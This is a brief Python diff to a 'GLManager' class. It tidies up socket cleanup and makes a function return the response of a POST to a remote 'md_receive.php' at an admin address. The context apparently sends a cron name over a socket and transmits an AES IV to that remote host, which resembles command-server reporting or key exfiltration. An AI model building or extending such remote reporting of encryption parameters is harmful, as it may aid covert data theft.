@@ -24,7 +24,8 @@ class GLManager:
             sock.send(bytes(cron_name, 'utf-8'));
             sock.close();
         except Exception as e:
-            sock.close()
+            if 'sock' in locals():
+                sock.close()
     
     def TechInfo():
         json_str = {
@@ -59,4 +60,4 @@ class GLManager:
             "iv": aes_IV
         }
         r = requests.post("http://"+admin_addr+"/md_receive.php", data = data)
-    
+        return r
